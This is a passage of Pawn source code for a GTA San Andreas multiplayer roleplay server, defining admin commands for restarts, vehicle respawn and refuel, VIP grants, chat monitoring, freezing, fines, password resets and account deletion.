	if(Player[playerid][pAdmin] >= 1337)
	{
     	if(!Logged(playerid)) return NoLogin(playerid);
     	if(sscanf(var, "s[32]", time))
        {
        	SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /gmx [time]");
         	SendClientMessage(playerid, COLOR_WHITE, "** [TIMES]: Instant / Later / Cancel");
        }
    	if(!strcmp(var, "instant", true))
    	{
    	    format(string, sizeof(string), "AdmCmd: %s has initiated an instant server restart.", GetName(playerid));
         	SendClientMessageToAll(COLOR_LIGHTRED, string);
			foreach(Player, i)
            {
		  		SaveChar(i);
       			ClearCar(i);
       			ClearChar(i);
       			GMX[i] = 1;
            }
            SendRconCommand("gmx");
    	}
    	else if(!strcmp(var, "later", true))
    	{
            foreach(Player, i)
            {
            	GMX[i] = SetTimer("gmxtimer", 30000, false);
            }
        	format(string, sizeof(string), "AdmCmd: %s has initiated a server restart, it will occur in the next 30 seconds.", GetName(playerid));
         	SendClientMessageToAll(COLOR_LIGHTRED, string);
    	}
    	else if(!strcmp(var, "cancel", true))
    	{
            foreach(Player, i)
            {
            	KillTimer(GMX[i]);
            }
        	format(string, sizeof(string), "AdmCmd: %s has cancelled the server restart.", GetName(playerid));
         	SendClientMessageToAll(COLOR_LIGHTRED, string);
    	}
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}

IRP:respawn(playerid, var[])
{
	new string[128], veh;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
        if(!strcmp(var, "all", true))
        {
            for(new i=0; i<MAX_VEHICLES; i++)
            {
	            new vehs;
        		foreach(Player, x)
		   		{
		   		    if(GetPlayerVehicleID(x) == i)
		   		    {
		   		        vehs = 1;
		   		    }
		   		}
		   		if(!vehs)
		   		{
	   				SetVehicleToRespawn(i);
	    		}
		   		vehs = 0;
            }
     		format(string, sizeof(string), "AdminWarning: All unsed vehicles have been respawned by %s.", GetName(playerid));
    		SendAdminMessage(COLOR_ADMWARN, string);
            return 1;
        }
        if(sscanf(var, "i", veh)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /respawn [vehicleid or all]");
        SetVehicleToRespawn(veh);
        format(string, sizeof(string), "AdminWarning: Vehicle ID %d has been respawned by %s.", veh, GetName(playerid));
        SendAdminMessage(COLOR_ADMWARN,  string);
        return 1;
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}

IRP:refuel(playerid, var[])
{
	new string[128], veh;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 4)
	{
        if(!strcmp(var, "all", true))
        {
            for(new i=0; i<MAX_VEHICLES; i++)
            {
                Fuel[i] = 100;
            }
            format(string, sizeof(string), "AdminWarning: %s has refilled all vehicles.", GetName(playerid));
            SendAdminMessage(COLOR_ADMWARN,  string);
            return 1;
        }
        if(sscanf(var, "i", veh)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /refuel [vehicleid or all]");
        Fuel[veh] = 100;
        format(string, sizeof(string), "AdminWarning: Vehicle ID %d has been refilled by %s.", veh, GetName(playerid));
        SendAdminMessage(COLOR_ADMWARN,  string);
    }
	else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:fuelfixshit(playerid, var[])// Fuel Fixing
{
    for(new i=0; i<MAX_VEHICLES; i++)
    {
       Fuel[i] = 100;
    }
	return 1;
}
IRP:makevip(playerid, var[])
{
	new user, viplevel, viptime, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
    	if(sscanf(var, "uii", user, viplevel, viptime)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /makevip [playerid] [level] [days]");
    	if(viplevel < 0 || viplevel > 5) return SendClientMessage(playerid, COLOR_GRAD2, "VIP packages are between 1 to 5.");
    	if(viptime < 1 || viptime > 30) return SendClientMessage(playerid, COLOR_GRAD2, "VIP days are between 1 to 30.");
    	if(viplevel == 0)
    	{
    	    Player[user][pVIP] = 0;
    		Player[user][pVIPDay] = 0;
    		Player[user][pVIPMonth] = 0;
    		Player[user][pVIPHour] = 0;
    		Player[user][pVIPTemp] = 0;
    		format(string, sizeof(string), "AdminWarning: %s has removed %s's VIP package.", GetName(playerid), GetName(user));
    		SendAdminMessage(COLOR_ADMWARN,  string);
    		Log("Log/Admins/makevip.log", string);
    		format(string, sizeof(string), " Your VIP Package has been removed by %s.", GetName(playerid));
    		SendClientMessage(user, COLOR_ADMWARN, string);
    		return 1;
    	}
    	else if(viplevel == 1)
    	{
        	// Calculating
        	new Year, Month, Day;
        	new Hour, Minute, Second;
        	gettime(Hour, Minute, Second);
        	getdate(Year, Month, Day);
        	if(Day+viptime >= 30)
          	{
        	    new ActualDay;
        		Month ++;
        		ActualDay = viptime - (30-Day);
        		Player[user][pVIPDay] = ActualDay;
        		Player[user][pVIPMonth] = Month;
          		Player[user][pVIPHour] = Hour;
        	}
        	else
        	{
        	    Player[user][pVIPDay] = Day+viptime;
        		Player[user][pVIPMonth] = Month;
        		Player[user][pVIPHour] = Hour;
        	}
        	// Done
        	Player[user][pVIP] = 1;
        	Player[user][pVIPTemp] = 0;
        	format(string, sizeof(string), "AdminWarning: %s has given %s Bronze VIP package for %d days.", GetName(playerid), GetName(user), viptime);
        	SendAdminMessage(COLOR_ADMWARN,  string);
        	Log("Log/Admins/makevip.log", string);
        	format(string, sizeof(string), " Adminisistrator %s has given you %s Bronze VIP package for %d days.", GetName(playerid), RPVIPN(user), viptime);
        	SendClientMessage(user, COLOR_VIP, string);
        	Player[playerid][pCookie] += 10;
        	SendClientMessage(user, COLOR_VIP, "You've recieved 10 Cookies with the Bronze VIP package.");
        }
        else if(viplevel == 2)
    	{
        	// Calculating
        	new Year, Month, Day;
        	new Hour, Minute, Second;
        	gettime(Hour, Minute, Second);
        	getdate(Year, Month, Day);
        	if(Day+viptime >= 30)
          	{
        	    new ActualDay;
        		Month ++;
        		ActualDay = viptime - (30-Day);
        		Player[user][pVIPDay] = ActualDay;
        		Player[user][pVIPMonth] = Month;
          		Player[user][pVIPHour] = Hour;
        	}
        	else
        	{
        	    Player[user][pVIPDay] = Day+viptime;
        		Player[user][pVIPMonth] = Month;
        		Player[user][pVIPHour] = Hour;
        	}
        	// Done
        	Player[user][pVIP] = 2;
        	Player[user][pVIPTemp] = 0;
        	format(string, sizeof(string), "AdminWarning: %s has given %s Silver VIP package for %d days.", GetName(playerid), GetName(user), viptime);
        	SendAdminMessage(COLOR_ADMWARN,  string);
        	Log("Log/Admins/makevip.log", string);
        	format(string, sizeof(string), " Adminisistrator %s has given you %s Silver VIP package for %d days.", GetName(playerid), RPVIPN(user), viptime);
        	SendClientMessage(user, COLOR_VIP, string);
        	Player[playerid][pCookie] += 20;
        	SendClientMessage(user, COLOR_VIP, "You've recieved 20 Cookies with the Silver VIP package.");
        }
        else if(viplevel == 3)
    	{
        	// Calculating
        	new Year, Month, Day;
        	new Hour, Minute, Second;
        	gettime(Hour, Minute, Second);
        	getdate(Year, Month, Day);
        	if(Day+viptime >= 30)
          	{
        	    new ActualDay;
        		Month ++;
        		ActualDay = viptime - (30-Day);
        		Player[user][pVIPDay] = ActualDay;
        		Player[user][pVIPMonth] = Month;
          		Player[user][pVIPHour] = Hour;
        	}
        	else
        	{
        	    Player[user][pVIPDay] = Day+viptime;
        		Player[user][pVIPMonth] = Month;
        		Player[user][pVIPHour] = Hour;
        	}
        	// Done
        	Player[user][pVIP] = 3;
        	Player[user][pVIPTemp] = 0;
        	format(string, sizeof(string), "AdminWarning: %s has given %s Gold VIP package for %d days.", GetName(playerid), GetName(user), viptime);
        	SendAdminMessage(COLOR_ADMWARN,  string);
        	Log("Log/Admins/makevip.log", string);
        	format(string, sizeof(string), " Adminisistrator %s has given you %s Gold VIP package for %d days.", GetName(playerid), RPVIPN(user), viptime);
        	SendClientMessage(user, COLOR_VIP, string);
        	Player[playerid][pCookie] += 30;
        	SendClientMessage(user, COLOR_VIP, "You've recieved 30 Cookies with the Gold VIP package.");
        }
        else if(viplevel == 4)
    	{
        	// Calculating
        	new Year, Month, Day;
        	new Hour, Minute, Second;
        	gettime(Hour, Minute, Second);
        	getdate(Year, Month, Day);
        	if(Day+viptime >= 30)
          	{
        	    new ActualDay;
        		Month ++;
        		ActualDay = viptime - (30-Day);
        		Player[user][pVIPDay] = ActualDay;
        		Player[user][pVIPMonth] = Month;
          		Player[user][pVIPHour] = Hour;
        	}
        	else
        	{
        	    Player[user][pVIPDay] = Day+viptime;
        		Player[user][pVIPMonth] = Month;
        		Player[user][pVIPHour] = Hour;
        	}
        	// Done
        	Player[user][pVIP] = 4;
        	Player[user][pVIPTemp] = 0;
        	format(string, sizeof(string), "AdminWarning: %s has given %s Platinum VIP package for %d days.", GetName(playerid), GetName(user), viptime);
        	SendAdminMessage(COLOR_ADMWARN,  string);
        	Log("Log/Admins/makevip.log", string);
        	format(string, sizeof(string), " Adminisistrator %s has given you %s Platinum VIP package for %d days.", GetName(playerid), RPVIPN(user), viptime);
        	SendClientMessage(user, COLOR_VIP, string);
        	Player[playerid][pCookie] += 40;
        	SendClientMessage(user, COLOR_VIP, "You've recieved 40 Cookies with the Platinum VIP package.");
        }
        else if(viplevel == 5)
    	{
        	// Calculating
        	new Year, Month, Day;
        	new Hour, Minute, Second;
        	gettime(Hour, Minute, Second);
        	getdate(Year, Month, Day);
        	if(Day+viptime >= 30)
          	{
        	    new ActualDay;
        		Month ++;
        		ActualDay = viptime - (30-Day);
        		Player[user][pVIPDay] = ActualDay;
        		Player[user][pVIPMonth] = Month;
          		Player[user][pVIPHour] = Hour;
        	}
        	else
        	{
        	    Player[user][pVIPDay] = Day+viptime;
        		Player[user][pVIPMonth] = Month;
        		Player[user][pVIPHour] = Hour;
        	}
        	// Done
        	Player[user][pVIP] = 5;
        	Player[user][pVIPTemp] = 0;
        	format(string, sizeof(string), "AdminWarning: %s has given %s Titan VIP package for %d days.", GetName(playerid), GetName(user), viptime);
        	SendAdminMessage(COLOR_ADMWARN,  string);
        	Log("Log/Admins/makevip.log", string);
        	format(string, sizeof(string), " Adminisistrator %s has given you %s Titan VIP package for %d days.", GetName(playerid), RPVIPN(user), viptime);
        	SendClientMessage(user, COLOR_VIP, string);
        	Player[playerid][pCookie] += 50;
        	SendClientMessage(user, COLOR_VIP, "You've recieved 50 Cookies with the Titan VIP package.");
        }
    	return 1;
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;

}
IRP:bigears(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 1 || Player[playerid][pStaffObserver])
	{
    	if(sscanf(var, "s[32]", var))
    	{
    		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /bigears [option]");
    		SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: Whisper | SMS | PM | ICchat");
    		return 1;
    	}
    	if(!strcmp(var, "whisper", true))
    	{
    	    if(!Whispers[playerid])
    	    {
    	        Whispers[playerid] = 1;
    	        SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have started listening to whispers.");
    	    }
    	    else
    	    {
    	        Whispers[playerid] = 0;
    	        SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have stopped listening to whispers.");
    	    }
    	}
    	else if(!strcmp(var, "sms", true))
    	{
    		if(!SMSes[playerid])
     	    {
    	        SMSes[playerid] = 1;
	            SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have started listening to SMSes.");
    	    }
    	    else
	        {
	            SMSes[playerid] = 0;
	            SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have stopped listening to SMSes.");
    	    }
    	}
    	else if(!strcmp(var, "icchat", true))
    	{
    		if(!ICchat[playerid])
     	    {
    	        ICchat[playerid] = 1;
	            SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have started listening to In-Character Chat.");
    	    }
    	    else
	        {
	            ICchat[playerid] = 0;
	            SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have stopped listening to In-Character Chat.");
    	    }
    	}
    	else if(!strcmp(var, "pm", true))
    	{
    	    if(!PMs[playerid])
    	    {
    	        PMs[playerid] = 1;
	            SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have started listening to PMs.");
    	    }
    	    else
    	    {
    	        PMs[playerid] = 0;
    	        SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have stopped listening to PMs.");
    	    }
    	}
    	else SendClientMessage(playerid, COLOR_GRAD2, "You've written an invalid option.");
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}

IRP:tabcheck(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 2)
	{
    	SendClientMessage(playerid, COLOR_LIGHTBLUE, "[Alt-Tabbed Players]:");
    	foreach(Player, i)
    	{
    	    if(Logged(i) && Tabbed[i])
    	    {
	    	    format(string, sizeof(string), "%d) %s (%d Seconds)", i, GetName(i), AltTabbed[i]);
	    	    SendClientMessage(playerid, COLOR_WHITE, string);
    	    }
    	}
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}

IRP:afkcheck(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 2)
	{
    	SendClientMessage(playerid, COLOR_LIGHTBLUE, "[AFK Players]:");
    	foreach(Player, i)
    	{
    	    if(Logged(i) && IsAFK[i])
    	    {
	    	    format(string, sizeof(string), "%d) %s (%d Seconds)", i, GetName(i), AFK[i]);
	    	    SendClientMessage(playerid, COLOR_WHITE, string);
	        }
    	}
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}


IRP:switchfam(playerid, var[])
{
	new string[128], input;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pGangMod])
	{
    	if(sscanf(var, "i", input)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /switchfam [slot]");
    	if(input < 1 || input > 7) return SendClientMessage(playerid, COLOR_GRAD2, "Family slots are between 1 to 7.");
    	Player[playerid][pFam] = input;
    	Player[playerid][pFamRank] = 1;
    	format(string, sizeof(string), " You have switched to the %s family.", FamInfo[input][fName]);
    	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}

IRP:switchfac(playerid, var[])
{
	new string[256], input;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pFacMod]) return NoAuth(playerid);
	if(sscanf(var, "i", input))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /switchfac [faction]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [FACTIONS]: 0) Citizenship | 1) LSPD | 2) San Andreas Government | 3) Hitman Agency | 4) News Agency 5) LSFMD");
		SendClientMessage(playerid, COLOR_GRAD2, "** [FACTIONS]: 6) FBI 7) NG");
		return 1;
	}
	if(input < 0 || input > 7) return SendClientMessage(playerid, COLOR_GRAD2, "You've entered an invalid faction id");
	Player[playerid][pFac] = input;
	Player[playerid][pFacRank] = 1;
	format(string, sizeof(string), "You have switched to the %s faction.", RPFN(playerid));
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	return 1;
}

IRP:ch(playerid, var[])
{
	new user, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /ch [playerid]");
    	if(!Logged(user)) return NoLoginB(playerid);
        if(HHcheckUsed != 0)
        {
           SendClientMessage(playerid, COLOR_WHITE, "The health hack check is being used by another admin, please try again in a moment!");
           return 1;
        }
    	HHcheckUsed = 1;
     	format(string, sizeof(string), "AdminWarning: %s has initiated a health hack check on %s.", GetName(playerid), GetName(user));
     	SendAdminMessage(COLOR_ADMWARN,  string);
    	GetPlayerHealth(user, HHcheckFloats[user][0]);
    	GetPlayerArmour(user, HHcheckFloats[user][1]);
    	GetPlayerPos(user, HHcheckFloats[user][2], HHcheckFloats[user][3], HHcheckFloats[user][4]);
    	GetPlayerFacingAngle(user, HHcheckFloats[user][5]);
    	HHcheckVW[user] = GetPlayerVirtualWorld(user);
    	HHcheckInt[user] = GetPlayerInterior(user);
    	TogglePlayerControllable(user, 1);
     	SetPlayerCameraPos(user, 2057.1284,-1913.4607,661.1432);
    	SetPlayerCameraLookAt(user, 1909.5645,-1876.0581,661.1432);
        SetPlayerVirtualWorld(user, 0);
    	SetPlayerInterior(user, 1);
        SetPlayerHealth(user, 100);
        SetPlayerArmour(user, 0);
    	SetPlayerPos(user, -1400.994873, 106.899650, 1032.273437);
    	SetPlayerFacingAngle(user, 90.66);
    	CreateExplosion(-1400.994873, 106.899650 , 1032.273437, 8, 20);
     	SetTimerEx("HealthHackCheck", 1250, 0, "dd", playerid, user);
    }
    else
    {
		NoAuth(playerid);
	}
   	return 1;
}

IRP:setpassword(playerid, var[])
{
    new user[32], string[128], file[32], password[256];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 1337)
    {
    	if(sscanf(var, "s[32]s[256]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /setpassword [playername] [password]");
    	if(RPIDFN(user) != INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GRAD2, "This player is already online in this server.");
    	format(file, sizeof(file), "Accounts/%s.ini", user);
    	if(!dini_Exists(file)) return SendClientMessage(playerid, COLOR_GRAD2, "I can't find this player in the database.");
    	WP_Hash(password, sizeof(password), var);
    	dini_Set(file, "Password", password);
    	format(string, sizeof(string), "AdminWarning: %s has changed %s's password.", GetName(playerid), user);
    	SendAdminMessage(COLOR_ADMWARN,  string);
     	Log("Log/Admins/setpass.log", string);
    	format(string, sizeof(string), "* You have changed %s's password to: {FFFF00}%s", user, var);
    	SendClientMessage(playerid, COLOR_WHITE, string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}

IRP:clearchat(playerid, var[])
{
    new string[128];
    if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] >= 3)
   	{
    	for(new i=0; i<100; i++)
    	{
    	    SendClientMessageToAll(COLOR_WHITE, "");
    	}
    	format(string, sizeof(string), "AdminWarning: The chat window has been cleared by %s", GetName(playerid));
    	SendAdminMessage(COLOR_ADMWARN, string);
    }
	return 1;
}

IRP:fine(playerid, var[])
{
	new string[128], user, amount;
    if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] >= 2)
   	{
    	if(sscanf(var, "uis[32]", user, amount, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /fine [playerid] [amount] [reason]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "Negative numbers? It's not possible to do that.");
    	GiveZamoraMoney(user, -amount);
    	format(string, sizeof(string), "AdmCmd: %s has been fined $%d by %s, reason: %s", GetName(user), amount, GetName(playerid), var);
    	SendClientMessageToAll(COLOR_LIGHTRED, string);
    	Log("Log/Admins/fine.log", string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:revive(playerid, var[])
{
	new string[128], user;
    if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] >= 2)
   	{
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /revive [playerid]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	if(!Player[user][pDead]) return SendClientMessage(playerid, COLOR_GRAD2, "That player is not injured.");
    	Player[user][pDead] = 0;
    	TogglePlayerControllable(user, 1);
    	StopLoopingAnim(user);
    	SetPlayerHealth(user, 100);
    	SetCameraBehindPlayer(user);
    	format(string, sizeof(string), "AdminWarning: %s has revived %s.", GetName(playerid), GetName(user));
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	SendClientMessage(user, COLOR_WHITE, "** You've been revived by an administrator.");
    	Log("Log/Admins/revive.log", string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:sunfreeze(playerid, var[])
{
	new string[128], user;
	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pStaffObserver])
   	{
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sunfreeze [playerid]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	TogglePlayerControllable(user, 1);
    	format(string, sizeof(string), "* You have unfreezed %s.", GetName(user));
    	SendClientMessage(playerid, COLOR_WHITE, string);
    	format(string, sizeof(string), "* %s has unfreezed you.", Player[playerid][pSName]);
    	SendClientMessage(user, COLOR_WHITE, string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}

IRP:sfreeze(playerid, var[])
{
	new string[128], user;
	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pStaffObserver])
    {
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sfreeze [playerid]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	TogglePlayerControllable(user, 0);
    	format(string, sizeof(string), "* You have freezed %s.", GetName(user));
    	SendClientMessage(playerid, COLOR_WHITE, string);
    	format(string, sizeof(string), "* %s has freezed you.", Player[playerid][pSName]);
    	SendClientMessage(user, COLOR_WHITE, string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:unfreeze(playerid, var[])
{
	new string[128], user;
	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] >= 3)
   	{
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /unfreeze [playerid]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	TogglePlayerControllable(user, 1);
    	format(string, sizeof(string), "* You have unfreezed %s.", GetName(user));
    	SendClientMessage(playerid, COLOR_WHITE, string);
    	format(string, sizeof(string), "* Administrator %s has unfreezed you.", GetName(playerid));
    	SendClientMessage(user, COLOR_WHITE, string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}

IRP:freeze(playerid, var[])
{
	new string[128], user;
	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] >= 3)
    {
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /freeze [playerid]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	TogglePlayerControllable(user, 0);
    	format(string, sizeof(string), "* You have freezed %s.", GetName(user));
    	SendClientMessage(playerid, COLOR_WHITE, string);
    	format(string, sizeof(string), "* Administrator %s has freezed you.", GetName(playerid));
    	SendClientMessage(user, COLOR_WHITE, string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:freezerange(playerid, var[])
{
    new Float:distance, string[128];
    if(!Logged(playerid)) return NoLogin(playerid);
    if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
    if(sscanf(var, "f", distance))
    {
        SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /freezerange [distance]");
        return 1;
    }
    new Float:pos[3];
    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
    for(new i=0; i != MAX_PLAYERS; i++)
	{
        if(Logged(i) && IsPlayerInRangeOfPoint(i,distance, pos[0], pos[1], pos[2]))
		{
            TogglePlayerControllable(i, 0);
        }
    }
    format(string, sizeof(string), "%s has freezed everyone online with %f range from his position.", GetName(playerid), distance);
    SendClientMessageToAll(COLOR_LIGHTRED, string);
    return 1;
}
IRP:unfreezerange(playerid, var[])
{
    new Float:distance, string[128];
    if(!Logged(playerid)) return NoLogin(playerid);
    if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
    if(sscanf(var, "f", distance))
    {
        SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /unfreezerange [distance]");
        return 1;
    }
    new Float:pos[3];
    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
    for(new i=0; i != MAX_PLAYERS; i++)
	{
        if(Logged(i) && IsPlayerInRangeOfPoint(i,distance, pos[0], pos[1], pos[2]))
		{
            TogglePlayerControllable(i, 1);
        }
    }
    format(string, sizeof(string), "%s has freezed everyone online with %f range from his position.", GetName(playerid), distance);
    SendClientMessageToAll(COLOR_LIGHTRED, string);
    return 1;
}
IRP:clearcontract(playerid, var[])
{
	new user, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] >= 1337)
    {
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /clearcontract [playerid]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	if(!Player[user][pContract]) return SendClientMessage(playerid, COLOR_GRAD2, "This player has no contract on their head.");
    	Player[user][pContract] = 0;
    	format(Player[user][pContractBy], 32, "");
    	format(string, sizeof(string), "HitmanWarning: %s has cleared the contract on %s's head.", GetName(playerid), GetName(user));
    	SendHitmanMessage(COLOR_YELLOW, string);
    	SendAdminMessage(COLOR_ADMWARN,  string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}

IRP:deleteaccount(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] == 100000)
	{
    	if(sscanf(var, "s[32]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /deleteaccount [name]");
    	format(string, sizeof(string), "Accounts/%s.ini", var);
    	if(!dini_Exists(string)) return SendClientMessage(playerid, COLOR_GRAD2, "This player doesn't exist in the database.");
     	dini_Remove(string);
    	format(string, sizeof(string), "AdminWarning: %s has deleted %s's userfile from the database.", GetName(playerid), var);
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	Log("Log/Admins/deleteaccount.log", string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}

IRP:approve(playerid, var[])
{
	new string[128], option[32], idx;
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] >= 3)
    {
     	if(sscanf(var, "s[32]", option))
     	{
            SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /approve [option]");
   	        SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: taxrequest | safe | HQ | namechange | pnamechange");
     	    return 1;
     	}
    	if(!strcmp(option, "taxrequest", true, 10))
    	{
    	    if(Player[playerid][pAdmin] < 3) return SendClientMessage(playerid, COLOR_GRAD2, "You are not authorized to approve tax percent requests.");
    		if(TaxRequester == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has requested a tax percent change.");
    		TaxPercent = TempTaxPercent;
	    	format(string, sizeof(string), "AdmCmd: %s has accepted %s's request to change the tax percent to %d.", GetName(playerid), GetName(TaxRequester), TaxPercent);
	    	SendAdminMessage(COLOR_ADMWARN,  string);
	    	Log("Log/Admins/settax.log", string);
	    	format(string, sizeof(string), " Administrator %s has approved your requset to change the tax percent.", GetName(playerid));
            SendClientMessage(TaxRequester, COLOR_LIGHTBLUE, string);
     		//TempTaxPercent = 0;
    		TaxRequester = -1;
    	}
    	if(!strcmp(option, "safe", true, 10))
    	{
            if(Player[playerid][pAdmin] < 3) return SendClientMessage(playerid, COLOR_GRAD2, "You are not authorized to approve safe adjustement requests.");
            idx = Player[SafeRequester][pFam];
    		if(SafeRequester == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has requested a safe for his family.");
    		if(FamInfo[idx][fSafeX] != 0 && FamInfo[idx][fSafeY] != 0 && FamInfo[idx][fSafeZ] != 0)
    		{
	        	format(string, sizeof(string), "AdmCmd: %s has accepted %s's request to changing his family's safe location.", GetName(playerid), GetName(SafeRequester));
    	    	SendAdminMessage(COLOR_ADMWARN,  string);
	        	format(string, sizeof(string), " Administrator %s has approved your requset to changing your family's safe location, and took $70000.", GetName(playerid));
                SendClientMessage(SafeRequester, COLOR_LIGHTBLUE, string);
                GiveZamoraMoney(SafeRequester, -70000);
                GetPlayerPos(SafeRequester,FamInfo[idx][fSafeX], FamInfo[idx][fSafeY], FamInfo[idx][fSafeZ]);
                //DestroyDynamicPickup(FamInfo[idx][fPickup]);
                FamInfo[idx][fPickup] = CreateDynamicPickup(1239, 1, FamSafeX[SafeRequester], FamSafeY[SafeRequester],FamSafeZ[SafeRequester], -1);
              	//DestroyDynamic3DTextLabel(FamInfo[idx][fText]);
             	format(string, sizeof(string), "%s's Safe", FamInfo[idx][fName]);
               	FamInfo[idx][fText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, FamSafeX[SafeRequester], FamSafeY[SafeRequester], FamSafeZ[SafeRequester]+0.5, 15);
        		SafeRequester = -1;
        		if(!FamInfo[idx][fSafeAchievment])
                {
                    FamInfo[idx][fSafeAchievment] = 1;
                    format(string, sizeof(string), "FamCmd: %s completed an achievment {01A9DB}We are safe {FF6347}and recieved 4 family cookies.", FamInfo[idx][fName]);
	              	SendClientMessageToAll(COLOR_LIGHTRED, string);
	              	FamInfo[idx][fCookies] += 4;
  	            }
        	}
        	else
    		{
                format(string, sizeof(string), "AdmCmd: %s has accepted %s's request to creating his family's safe.", GetName(playerid), GetName(SafeRequester));
        	   	SendAdminMessage(COLOR_ADMWARN,  string);
	           	format(string, sizeof(string), " Administrator %s has approved your requset to creating your family's safe, and took $50000.", GetName(playerid));
                SendClientMessage(SafeRequester, COLOR_LIGHTBLUE, string);
                GiveZamoraMoney(SafeRequester, -50000);
                GetPlayerPos(SafeRequester,FamInfo[idx][fSafeX], FamInfo[idx][fSafeY], FamInfo[idx][fSafeZ]);
                DestroyDynamicPickup(FamInfo[idx][fPickup]);
                FamInfo[idx][fPickup] = CreateDynamicPickup(1239, 1, FamSafeX[SafeRequester], FamSafeY[SafeRequester],FamSafeZ[SafeRequester], -1);
